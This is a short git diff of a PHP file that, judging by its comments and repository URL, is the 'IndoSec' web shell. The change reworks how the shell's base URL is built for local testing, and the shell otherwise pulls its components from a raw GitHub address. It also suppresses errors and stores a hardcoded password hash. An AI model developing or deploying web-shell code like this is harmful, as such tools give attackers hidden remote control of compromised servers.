@@ -47,8 +47,12 @@ error_reporting(0);
 /* Configurasi */
 $aupas 					= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
 $_SESSION["password"] 	= $aupas;
+$clean 					= explode("/", trim($_SERVER['REQUEST_URI'],'/\\'));
+array_pop($clean);
+$clean 					= implode("/", $clean);
+$url 					= sprintf('%s://%s/%s', isset($_SERVER['HTTPS']) ? 'https' : 'http', $_SERVER['HTTP_HOST'], $clean);
 $isLocal 				= ($_SERVER['HTTP_HOST'] === "localhost" || in_array($_SERVER['REMOTE_ADDR'], ['127.0.0.1', '::1']));
-$BASE_URL				= $isLocal ? "http://localhost/www/percobaan/ids-shell" : "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main";
+$BASE_URL				= $isLocal ? $url : "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main";
 
 function curlRequest($url)
 {
